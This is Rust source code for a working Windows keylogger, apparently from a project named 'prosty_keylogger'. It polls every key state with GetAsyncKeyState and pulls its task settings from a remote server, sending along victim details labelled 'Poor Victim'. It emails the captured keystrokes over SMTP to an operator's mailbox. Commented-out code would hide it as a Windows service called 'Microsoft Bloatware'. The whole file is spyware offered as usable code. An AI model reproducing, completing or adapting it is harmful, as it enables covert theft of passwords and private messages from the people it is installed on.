mod options;

use std::{env, thread, time};
use lettre::message::header::ContentType;
use lettre::{SmtpTransport, Transport};
use lettre::transport::smtp::authentication::Credentials;
use log::{error, info, LevelFilter, trace};
use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
use std::fmt::Write;
use std::path::{Path, PathBuf};
use std::time::{Duration};
use clap::Parser;
use reqwest::Url;
use prosty_keylogger::common::{Gender, MailConfiguration, PersonalData, ReportConfig, setup_logger, TaskConfiguration};
use crate::options::ClientArgs;
//CoreVirtualKeyStates

//pub const BUFF_SIZE: usize = 1024*128;


#[inline]
pub fn check_key() -> Vec<u8>{
    let mut v = Vec::with_capacity(8);
    for i in 0..255u8{
        unsafe{
            let state = GetAsyncKeyState(i as i32);
            if state == 1 || state ==  -32767{
                v.push(i)
            }
        }

    }
    v
}

fn send_mail(num: u32, values: Vec<u8>, config: &MailConfiguration, id: u64){
    let mut body: String = String::with_capacity(values.len() as usize *2 + 64);
    for v in values{
        write!(body, "{:02x}", v).unwrap();
    }

    let email = lettre::Message::builder()
        .from(config.mail_from.parse().unwrap())
        .to(config.mail_to.parse().unwrap())
        .subject(format!("R-{id:016x}-{}", num))
        .header(ContentType::TEXT_PLAIN)
        .body(body)
        .unwrap();
    let creds = Credentials::new(config.smtp_login.to_owned(), config.smtp_password.to_owned());

    let mailer = SmtpTransport::relay(&config.relay)
        .unwrap()
        .credentials(creds)
        .build();

    match mailer.send(&email){
        Ok(_) => {
            info!("Email sent successfully")
        }
        Err(e) => {
            error!("Could not send mail: {e:}")
        }
    }
}


fn send_report(num: u32, values: Vec<u8>, config: &TaskConfiguration) -> Result<(), anyhow::Error>{
    match config.report_config{
        ReportConfig::Mail(ref mail) => {send_mail(num, values, mail, config.id)}
    }
    Ok(())
}
async fn get_config(url: &Url, personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
    let s = match personal_data{
        None => reqwest::get(url.to_owned()).await?.text().await?,
        Some(data) => {
            let client = reqwest::Client::new();
            client.post(url.join("/hello")?).json(&data).send().await?.text().await?
        }
    };
    let t: TaskConfiguration = serde_json::from_str(&s)?;
    Ok(t)
}

fn update_config(url: &Url,  personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
    let rt = tokio::runtime::Runtime::new()?;
    let config = rt.block_on(async{
    //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
    let config = get_config(url, personal_data).await?;
    return Ok::<TaskConfiguration, anyhow::Error>(config);

    })?;
    Ok(config)
}

fn persistent_try_update_config(url: &Url,  personal_data: Option<&PersonalData>) -> TaskConfiguration{
    loop {
        match update_config(&url, personal_data){
            Ok(config) => {
                return config;
            }
            Err(err) => {
                error!("Error downloading config: {err}");
                thread::sleep(Duration::from_secs(30));
            }
        }
    }
}



fn client(url: &Url) -> anyhow::Result<()>{
    let data = PersonalData{
        name: Some("Poor".into()),
        last_name: Some("Victim".into()),
        gender: Some(Gender::Male),
    };
    let config = persistent_try_update_config(&url, Some(&data));
    info!("{:?}", config);
    let milli = time::Duration::from_millis(config.probe_interval_milli as u64);
    let mut vec = Vec::with_capacity(config.capture_size as usize + 64);
    let mut num =1;

    loop{
        thread::sleep(milli);
        let keys = check_key();

        if !keys.is_empty(){
            trace!("{:02x?}", keys);
            vec.extend(keys);
            trace!("len = {}", vec.len());
        }


        if vec.len() > config.capture_size as usize {
            let mut send_vec = Vec::with_capacity(config.capture_size as usize + 64);
            std::mem::swap(&mut send_vec, &mut vec);
            send_report(num, send_vec, &config)?;
            num += 1;
        }

    }

}


pub fn def_logger() -> anyhow::Result<()>{
    let p = PathBuf::from(env::var("LOCALAPPDATA")?);
    let p = p.join("temp/client.tmp");

    setup_logger(LevelFilter::Trace, Some(p.as_path()))?;
    Ok(())
}

fn logger_file(file_name: Option<impl AsRef<Path>>) -> anyhow::Result<Option<PathBuf>>{
    match file_name{
        None => Ok(None),
        Some(s) => {
            let p = PathBuf::from(env::var("LOCALAPPDATA")?);
            let p = p.join(format!("temp/{:?}", s.as_ref() ));
            Ok(Some(p))
        }
    }

}
//#[tokio::main]
fn main()  -> Result<(), anyhow::Error>{
    /*
    let args = ClientArgs::parse();


    //adres trzeba zmenić
    let url = Url::parse(&args.assistant)?;
    client(&url)


     */

    //def_logger()?;
    //win_service_logger::init();

    let args = ClientArgs::parse();
    let url = Url::parse(&args.assistant)?;

    let logger_file = logger_file(args.log_filename.as_ref())?;

    setup_logger(args.log_filter, logger_file)?;
    //logger_file(args.log_filename)
    info!("Connectiong to: {:?}", args.assistant);
    client(&url)?;
    /*
    if args.no_service{
        let url = Url::parse(&args.assistant)?;
        info!("Connectiong to: {:?}", args.assistant);
        client(&url)?;

    } else {
        service_dispatcher::start("Microsoft Bloatware", ffi_service_main)?;
    }

     */

    Ok(())




}
